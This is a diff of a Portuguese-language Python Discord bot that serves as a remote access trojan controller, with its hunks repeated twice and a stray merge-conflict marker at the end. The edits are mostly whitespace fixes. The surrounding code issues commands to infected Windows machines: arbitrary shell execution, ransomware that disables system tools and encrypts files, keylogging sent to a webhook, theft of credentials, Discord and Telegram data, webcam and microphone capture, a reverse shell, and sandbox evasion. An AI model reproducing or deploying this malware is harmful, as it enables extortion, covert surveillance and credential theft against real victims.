@@ -36,7 +36,7 @@ from libraries.r4s000u4ere import bts, d1r3ct03232ry3cnrypt, e333ncryp443344d132
 from libraries.p333s1st3nt import blocksites, n3v3rp4r4, st44rt4trup
 from libraries.r3cov333r1 import r3c00v, r3c0ff, n0r33g1, y3sr3g, n0cdm, y3scdm, n0t4sk, y3st4sk
 from libraries.cl222p34crypto import s44t4r4tc1lp3r, st0pcl111p
-import logging 
+import logging
 from libraries import layn
 
 
@@ -45,7 +45,7 @@ GUILD = discord.Object(id = "ID GRUPO")
 CHANNEL = ID CANAL
 KEYLOGGER_WEBHOOK = "WEBHOOK DISCORD"
 CURRENT_AGENT = 0
-BOT_TOKEN = "TOKEN BOT"
+BOT_TOKEN = "COLOQUE_SEU_TOKEN_AQUI"
 
 class Bot(commands.Bot):
     def __init__(self):
@@ -56,14 +56,14 @@ class Bot(commands.Bot):
 
     async def on_ready(self):
         await self.wait_until_ready()
-    
+
         self.channel = self.get_channel(CHANNEL)
         now = datetime.now()
         my_embed = discord.Embed(title=f"{MSG}",description=f"**Horário: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=COLOR)
         my_embed.add_field(name="**IP**", value=layn.g3t1p(), inline=True)
         my_embed.add_field(name="**Bits**", value=layn.g3tb1t(), inline=True)
         my_embed.add_field(name="**HostName**", value=layn.g3th0stn4me(), inline=True)
-        my_embed.add_field(name="**OS**", value=layn.g3tSg3t(), inline=True) 
+        my_embed.add_field(name="**OS**", value=layn.g3tSg3t(), inline=True)
         my_embed.add_field(name="**Usuario**", value=layn.g3tus3rn4me(), inline=True)
         my_embed.add_field(name="**CPU**", value=layn.g3tPCU(), inline=False)
         my_embed.add_field(name="**Admin**", value=layn.x1s4dm1n(), inline=True)
@@ -114,7 +114,7 @@ class InteractButton(discord.ui.View):
     async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
         result = layn.pr0cess()
         if len(result) > 4000:
-            path = os.environ["temp"] +"\\response.txt"         
+            path = os.environ["temp"] +"\\response.txt"
             with open(path, 'w') as file:
                 file.write(result)
             await interaction.response.send_message(file=discord.File(path))
@@ -190,11 +190,11 @@ async def change_prefix(ctx: commands.Context, new_prefix: str):
 @bot.hybrid_command(name = "interact", with_app_command = True, description = "Interagir com o Client")
 @app_commands.guilds(GUILD)
 async def interact(ctx: commands.Context, id:int):
-    global CURRENT_AGENT 
+    global CURRENT_AGENT
     CURRENT_AGENT = id
     my_embed = discord.Embed(title=f"interagindo com o ID #{id}", color=0x00FF00)
     await ctx.reply(embed=my_embed)
-    
+
 
 
 @bot.hybrid_command(name = "diretorios", with_app_command = True, description = "Lista diretórios padrão do Windows")
@@ -221,7 +221,7 @@ async def conexao(ctx: commands.Context):
         my_embed = discord.Embed(title=f"CONECTADO AO ID #{CURRENT_AGENT}", color=0x00FF00)
     else:
         my_embed = discord.Embed(title="Nenhum ID conectado", color=0xFF0000)
-        
+
     await ctx.reply(embed=my_embed)
 
 @bot.hybrid_command(name = "cmd", with_app_command = True, description = "Execute qualquer comando na máquina de destino")
@@ -230,21 +230,21 @@ async def cmd(ctx: commands.Context, command:str):
     if (int(CURRENT_AGENT) == int(ID)):
         result = layn.dcm(command)
         if len(result) > 4000:
-            path = os.environ["temp"] +"\\response.txt"     
+            path = os.environ["temp"] +"\\response.txt"
             with open(path, 'w') as file:
                 file.write(result)
             await ctx.reply(file=discord.File(path))
             os.remove(path)
         else:
             await ctx.reply("```"+result+"```")
-    
+
 
 @bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Execute qualquer comando em todos os IDs online")
 @app_commands.guilds(GUILD)
 async def cmd_all(ctx: commands.Context, command:str):
     result = layn.dcm(command)
     if len(result) > 4000:
-        path = os.environ["temp"] +"\\response.txt"     
+        path = os.environ["temp"] +"\\response.txt"
         with open(path, 'w') as file:
             file.write(result)
         await ctx.reply(file=discord.File(path))
@@ -260,7 +260,7 @@ async def webshot(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
         if ctx.interaction:
             my_embed = discord.Embed(title=f"use **!webcam {ID}** em vez do comando slash", color=0xFF0000)
-            await ctx.reply(embed=my_embed) 
+            await ctx.reply(embed=my_embed)
         else:
             result = layn.webshot()
             if result != False:
@@ -269,7 +269,7 @@ async def webshot(ctx: commands.Context):
             else:
                 my_embed = discord.Embed(title=f"Error ao tirar foto da webcam #{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "ranso", with_app_command = True, description = "Travar a tela do alvo com ransomware")
 @app_commands.guilds(GUILD)
@@ -279,15 +279,15 @@ async def ransomware(ctx: commands.Context):
         n0r33g1()
         n0cdm()
         n0t4sk()
-        
-       
+
+
         key = os.urandom(16)  # Gera uma chave AES aleatória
-        e333ncryp443344d1322ves(key) 
-        
-        bts(ctx) # inicia o ransomware 
+        e333ncryp443344d1322ves(key)
+
+        bts(ctx) # inicia o ransomware
         #log_file = os.path.join(os.getenv("TEMP"), "encrypted_files_log.txt")
         #await ctx.reply(f"Ransomware iniciado e a tela do alvo foi travada.\nlogs: {log_file}")
-    
+
     else:
         await ctx.send("Nenhum ID conectado.")
 @bot.hybrid_command(name = "unranso", with_app_command = True, description = "Reverter as alterações feitas pelo ransomware")
@@ -299,12 +299,12 @@ async def unransomware(ctx: commands.Context):
         y3sr3g()
         y3scdm()
         y3st4sk()
-        
+
         await ctx.send("Alterações do ransomware revertidas.")
     else:
         await ctx.send("Nenhum ID conectado.")
 
-        
+
 @bot.hybrid_command(name = "cd", with_app_command = True, description = "Alterar o diretório atual na máquina de destino")
 @app_commands.guilds(GUILD)
 async def cd(ctx: commands.Context, path:str):
@@ -313,9 +313,9 @@ async def cd(ctx: commands.Context, path:str):
         if (result):
             my_embed = discord.Embed(title=f"Alterado com sucesso o diretório para: {path}", color=0x00FF00)
         else:
-            my_embed = discord.Embed(title=f"Error ao acessar o diretório:\n{result}", color=0xFF0000)    
+            my_embed = discord.Embed(title=f"Error ao acessar o diretório:\n{result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "process", with_app_command = True, description = "Listar todos os processos em execução na máquina de destino")
 @app_commands.guilds(GUILD)
@@ -323,14 +323,14 @@ async def process(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
         result = layn.pr0cess()
         if len(result) > 4000:
-            path = os.environ["temp"] +"\\response.txt"         
+            path = os.environ["temp"] +"\\response.txt"
             with open(path, 'w') as file:
                 file.write(result)
             await ctx.reply(file=discord.File(path))
             os.remove(path)
         else:
             await ctx.reply(f"```\n{result}\n```")
-    
+
 @bot.hybrid_command(name = "startfile", with_app_command = True, description = "Inicia um arquivo na máquina de destino")
 @app_commands.guilds(GUILD)
 async def startfile(ctx: commands.Context, path: str):
@@ -385,7 +385,7 @@ async def gr333bd111scord(ctx: commands.Context):
      if ctx.interaction:
             my_embed = discord.Embed(title=f"use **!discord** em vez do comando slash", color=0xFF0000)
             await ctx.reply(embed=my_embed)
-     else:  
+     else:
         if (int(CURRENT_AGENT) == int(ID)):
             result = gr333bd111scord_lib.gr44bd11scord().initialize(raw_data=False)
             if isinstance(result, list):
@@ -432,7 +432,7 @@ async def scr333nsh0t(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error ao tirar uma captura de tela para #{ID}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "creds", with_app_command = True, description = "Obtenha as credenciais da máquina de destino")
 @app_commands.guilds(GUILD)
@@ -512,7 +512,7 @@ async def download(ctx: commands.Context, path:str):
         except Exception as e:
             my_embed = discord.Embed(title=f"Error ao baixar do #{ID}:\n{e}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "excluir", with_app_command = True, description = "Excluir o agente da máquina de destino")
 @app_commands.guilds(GUILD)
@@ -524,7 +524,7 @@ async def selfdestruct(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error ao excluir o #{ID}: {result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "localizar", with_app_command = True, description = "Obtenha a localização da máquina alvo")
 @app_commands.guilds(GUILD)
@@ -541,7 +541,7 @@ async def l0c4t1i00n(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error ao obter a localização do #{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "revshell", with_app_command = True, description = "Obtenha um shell reverso na máquina alvo")
 @app_commands.guilds(GUILD)
@@ -551,8 +551,8 @@ async def sh33lr3vs(ctx: commands.Context, ip:str, port:int):
         if result:
             my_embed = discord.Embed(title=f"Tentando estabelecer o Reverse Shell no #{ID}", color=0x00FF00)
         await ctx.reply(embed=my_embed)
-    
-    
+
+
 @bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Grave o microfone da máquina alvo")
 @app_commands.guilds(GUILD)
 async def m1cr3cord(ctx: commands.Context, seconds:int):
@@ -568,7 +568,7 @@ async def m1cr3cord(ctx: commands.Context, seconds:int):
             else:
                 my_embed = discord.Embed(title=f"Error ao iniciar a gravação no #{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Alterar o papel de parede da máquina alvo")
 @app_commands.guilds(GUILD)
@@ -580,7 +580,7 @@ async def w4llppp4p3r(ctx: commands.Context, path_url:str):
         else:
             my_embed = discord.Embed(title=f"Error ao mudar o papel de parede no #{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "killproc", with_app_command = True, description = "Mate um processo na máquina alvo")
 @app_commands.guilds(GUILD)
@@ -592,7 +592,7 @@ async def k1llpr0cccc(ctx: commands.Context, pid:int):
         else:
             my_embed = discord.Embed(title=f"Error ao matar o processo {pid} no #{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "keylog", with_app_command = True, description = "Inicie um keylogger na máquina de destino")
 @app_commands.guilds(GUILD)
@@ -605,7 +605,7 @@ async def keylog(ctx: commands.Context, mode:str ,interval:int):
         else:
             threading.Thread(target=logger.start).start()
             await ctx.reply(embed=discord.Embed(title=f"Keylogger iniciado no #{ID}", color=0x00FF00))
-    
+
 
 
 # Configuração do logger
@@ -630,7 +630,7 @@ async def t4l3g(ctx: commands.Context):
             else:
                 my_embed = discord.Embed(title=f"Erro ao obter telegram do #{ID}", color=0xFF0000)
                 asyncio.run_coroutine_threadsafe(ctx.reply(embed=my_embed), bot.loop)
-        
+
         threading.Thread(target=layn.g3t_t3l3g4am, args=(callback,)).start()
 
 @bot.hybrid_command(name = "historico", with_app_command = True, description = "Obtenha o histórico de navegação da máquina de destino")
@@ -866,7 +866,7 @@ from libraries.r4s000u4ere import bts, d1r3ct03232ry3cnrypt, e333ncryp443344d132
 from libraries.p333s1st3nt import blocksites, n3v3rp4r4, st44rt4trup
 from libraries.r3cov333r1 import r3c00v, r3c0ff, n0r33g1, y3sr3g, n0cdm, y3scdm, n0t4sk, y3st4sk
 from libraries.cl222p34crypto import s44t4r4tc1lp3r, st0pcl111p
-import logging 
+import logging
 from libraries import layn
 
 
@@ -886,14 +886,14 @@ class Bot(commands.Bot):
 
     async def on_ready(self):
         await self.wait_until_ready()
-    
+
         self.channel = self.get_channel(CHANNEL)
         now = datetime.now()
         my_embed = discord.Embed(title=f"{MSG}",description=f"**Horário: {now.strftime('%d/%m/%Y %H:%M:%S')}**", color=COLOR)
         my_embed.add_field(name="**IP**", value=layn.g3t1p(), inline=True)
         my_embed.add_field(name="**Bits**", value=layn.g3tb1t(), inline=True)
         my_embed.add_field(name="**HostName**", value=layn.g3th0stn4me(), inline=True)
-        my_embed.add_field(name="**OS**", value=layn.g3tSg3t(), inline=True) 
+        my_embed.add_field(name="**OS**", value=layn.g3tSg3t(), inline=True)
         my_embed.add_field(name="**Usuario**", value=layn.g3tus3rn4me(), inline=True)
         my_embed.add_field(name="**CPU**", value=layn.g3tPCU(), inline=False)
         my_embed.add_field(name="**Admin**", value=layn.x1s4dm1n(), inline=True)
@@ -944,7 +944,7 @@ class InteractButton(discord.ui.View):
     async def process(self, interaction:discord.Interaction, button:discord.ui.Button):
         result = layn.pr0cess()
         if len(result) > 4000:
-            path = os.environ["temp"] +"\\response.txt"         
+            path = os.environ["temp"] +"\\response.txt"
             with open(path, 'w') as file:
                 file.write(result)
             await interaction.response.send_message(file=discord.File(path))
@@ -1020,11 +1020,11 @@ async def change_prefix(ctx: commands.Context, new_prefix: str):
 @bot.hybrid_command(name = "interact", with_app_command = True, description = "Interagir com o Client")
 @app_commands.guilds(GUILD)
 async def interact(ctx: commands.Context, id:int):
-    global CURRENT_AGENT 
+    global CURRENT_AGENT
     CURRENT_AGENT = id
     my_embed = discord.Embed(title=f"interagindo com o ID #{id}", color=0x00FF00)
     await ctx.reply(embed=my_embed)
-    
+
 
 
 @bot.hybrid_command(name = "diretorios", with_app_command = True, description = "Lista diretórios padrão do Windows")
@@ -1051,7 +1051,7 @@ async def conexao(ctx: commands.Context):
         my_embed = discord.Embed(title=f"CONECTADO AO ID #{CURRENT_AGENT}", color=0x00FF00)
     else:
         my_embed = discord.Embed(title="Nenhum ID conectado", color=0xFF0000)
-        
+
     await ctx.reply(embed=my_embed)
 
 @bot.hybrid_command(name = "cmd", with_app_command = True, description = "Execute qualquer comando na máquina de destino")
@@ -1060,21 +1060,21 @@ async def cmd(ctx: commands.Context, command:str):
     if (int(CURRENT_AGENT) == int(ID)):
         result = layn.dcm(command)
         if len(result) > 4000:
-            path = os.environ["temp"] +"\\response.txt"     
+            path = os.environ["temp"] +"\\response.txt"
             with open(path, 'w') as file:
                 file.write(result)
             await ctx.reply(file=discord.File(path))
             os.remove(path)
         else:
             await ctx.reply("```"+result+"```")
-    
+
 
 @bot.hybrid_command(name = "cmd-all", with_app_command = True, description = "Execute qualquer comando em todos os IDs online")
 @app_commands.guilds(GUILD)
 async def cmd_all(ctx: commands.Context, command:str):
     result = layn.dcm(command)
     if len(result) > 4000:
-        path = os.environ["temp"] +"\\response.txt"     
+        path = os.environ["temp"] +"\\response.txt"
         with open(path, 'w') as file:
             file.write(result)
         await ctx.reply(file=discord.File(path))
@@ -1090,7 +1090,7 @@ async def webshot(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
         if ctx.interaction:
             my_embed = discord.Embed(title=f"use **!webcam {ID}** em vez do comando slash", color=0xFF0000)
-            await ctx.reply(embed=my_embed) 
+            await ctx.reply(embed=my_embed)
         else:
             result = layn.webshot()
             if result != False:
@@ -1099,7 +1099,7 @@ async def webshot(ctx: commands.Context):
             else:
                 my_embed = discord.Embed(title=f"Error ao tirar foto da webcam #{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "ranso", with_app_command = True, description = "Travar a tela do alvo com ransomware")
 @app_commands.guilds(GUILD)
@@ -1109,15 +1109,15 @@ async def ransomware(ctx: commands.Context):
         n0r33g1()
         n0cdm()
         n0t4sk()
-        
-       
+
+
         key = os.urandom(16)  # Gera uma chave AES aleatória
-        e333ncryp443344d1322ves(key) 
-        
-        bts(ctx) # inicia o ransomware 
+        e333ncryp443344d1322ves(key)
+
+        bts(ctx) # inicia o ransomware
         #log_file = os.path.join(os.getenv("TEMP"), "encrypted_files_log.txt")
         #await ctx.reply(f"Ransomware iniciado e a tela do alvo foi travada.\nlogs: {log_file}")
-    
+
     else:
         await ctx.send("Nenhum ID conectado.")
 @bot.hybrid_command(name = "unranso", with_app_command = True, description = "Reverter as alterações feitas pelo ransomware")
@@ -1129,12 +1129,12 @@ async def unransomware(ctx: commands.Context):
         y3sr3g()
         y3scdm()
         y3st4sk()
-        
+
         await ctx.send("Alterações do ransomware revertidas.")
     else:
         await ctx.send("Nenhum ID conectado.")
 
-        
+
 @bot.hybrid_command(name = "cd", with_app_command = True, description = "Alterar o diretório atual na máquina de destino")
 @app_commands.guilds(GUILD)
 async def cd(ctx: commands.Context, path:str):
@@ -1143,9 +1143,9 @@ async def cd(ctx: commands.Context, path:str):
         if (result):
             my_embed = discord.Embed(title=f"Alterado com sucesso o diretório para: {path}", color=0x00FF00)
         else:
-            my_embed = discord.Embed(title=f"Error ao acessar o diretório:\n{result}", color=0xFF0000)    
+            my_embed = discord.Embed(title=f"Error ao acessar o diretório:\n{result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "process", with_app_command = True, description = "Listar todos os processos em execução na máquina de destino")
 @app_commands.guilds(GUILD)
@@ -1153,14 +1153,14 @@ async def process(ctx: commands.Context):
     if (int(CURRENT_AGENT) == int(ID)):
         result = layn.pr0cess()
         if len(result) > 4000:
-            path = os.environ["temp"] +"\\response.txt"         
+            path = os.environ["temp"] +"\\response.txt"
             with open(path, 'w') as file:
                 file.write(result)
             await ctx.reply(file=discord.File(path))
             os.remove(path)
         else:
             await ctx.reply(f"```\n{result}\n```")
-    
+
 @bot.hybrid_command(name = "startfile", with_app_command = True, description = "Inicia um arquivo na máquina de destino")
 @app_commands.guilds(GUILD)
 async def startfile(ctx: commands.Context, path: str):
@@ -1215,7 +1215,7 @@ async def gr333bd111scord(ctx: commands.Context):
      if ctx.interaction:
             my_embed = discord.Embed(title=f"use **!discord** em vez do comando slash", color=0xFF0000)
             await ctx.reply(embed=my_embed)
-     else:  
+     else:
         if (int(CURRENT_AGENT) == int(ID)):
             result = gr333bd111scord_lib.gr44bd11scord().initialize(raw_data=False)
             if isinstance(result, list):
@@ -1262,7 +1262,7 @@ async def scr333nsh0t(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error ao tirar uma captura de tela para #{ID}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "creds", with_app_command = True, description = "Obtenha as credenciais da máquina de destino")
 @app_commands.guilds(GUILD)
@@ -1342,7 +1342,7 @@ async def download(ctx: commands.Context, path:str):
         except Exception as e:
             my_embed = discord.Embed(title=f"Error ao baixar do #{ID}:\n{e}", color=0xFF0000)
             await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "excluir", with_app_command = True, description = "Excluir o agente da máquina de destino")
 @app_commands.guilds(GUILD)
@@ -1354,7 +1354,7 @@ async def selfdestruct(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error ao excluir o #{ID}: {result}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "localizar", with_app_command = True, description = "Obtenha a localização da máquina alvo")
 @app_commands.guilds(GUILD)
@@ -1371,7 +1371,7 @@ async def l0c4t1i00n(ctx: commands.Context):
         else:
             my_embed = discord.Embed(title=f"Error ao obter a localização do #{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "revshell", with_app_command = True, description = "Obtenha um shell reverso na máquina alvo")
 @app_commands.guilds(GUILD)
@@ -1381,8 +1381,8 @@ async def sh33lr3vs(ctx: commands.Context, ip:str, port:int):
         if result:
             my_embed = discord.Embed(title=f"Tentando estabelecer o Reverse Shell no #{ID}", color=0x00FF00)
         await ctx.reply(embed=my_embed)
-    
-    
+
+
 @bot.hybrid_command(name = "recordmic", with_app_command = True, description = "Grave o microfone da máquina alvo")
 @app_commands.guilds(GUILD)
 async def m1cr3cord(ctx: commands.Context, seconds:int):
@@ -1398,7 +1398,7 @@ async def m1cr3cord(ctx: commands.Context, seconds:int):
             else:
                 my_embed = discord.Embed(title=f"Error ao iniciar a gravação no #{ID}", color=0xFF0000)
                 await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "wallpaper", with_app_command = True, description = "Alterar o papel de parede da máquina alvo")
 @app_commands.guilds(GUILD)
@@ -1410,7 +1410,7 @@ async def w4llppp4p3r(ctx: commands.Context, path_url:str):
         else:
             my_embed = discord.Embed(title=f"Error ao mudar o papel de parede no #{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "killproc", with_app_command = True, description = "Mate um processo na máquina alvo")
 @app_commands.guilds(GUILD)
@@ -1422,7 +1422,7 @@ async def k1llpr0cccc(ctx: commands.Context, pid:int):
         else:
             my_embed = discord.Embed(title=f"Error ao matar o processo {pid} no #{ID}", color=0xFF0000)
         await ctx.reply(embed=my_embed)
-    
+
 
 @bot.hybrid_command(name = "keylog", with_app_command = True, description = "Inicie um keylogger na máquina de destino")
 @app_commands.guilds(GUILD)
@@ -1435,7 +1435,7 @@ async def keylog(ctx: commands.Context, mode:str ,interval:int):
         else:
             threading.Thread(target=logger.start).start()
             await ctx.reply(embed=discord.Embed(title=f"Keylogger iniciado no #{ID}", color=0x00FF00))
-    
+
 
 
 # Configuração do logger
@@ -1460,7 +1460,7 @@ async def t4l3g(ctx: commands.Context):
             else:
                 my_embed = discord.Embed(title=f"Erro ao obter telegram do #{ID}", color=0xFF0000)
                 asyncio.run_coroutine_threadsafe(ctx.reply(embed=my_embed), bot.loop)
-        
+
         threading.Thread(target=layn.g3t_t3l3g4am, args=(callback,)).start()
 
 @bot.hybrid_command(name = "historico", with_app_command = True, description = "Obtenha o histórico de navegação da máquina de destino")
@@ -1658,4 +1658,3 @@ if vmsai.test() == True and layn.isVM() == False:
         COLOR = 0x0000FF
 
     bot.run(BOT_TOKEN)
->>>>>>> 92133aa985018b483d51826bc719114e819fdf9e
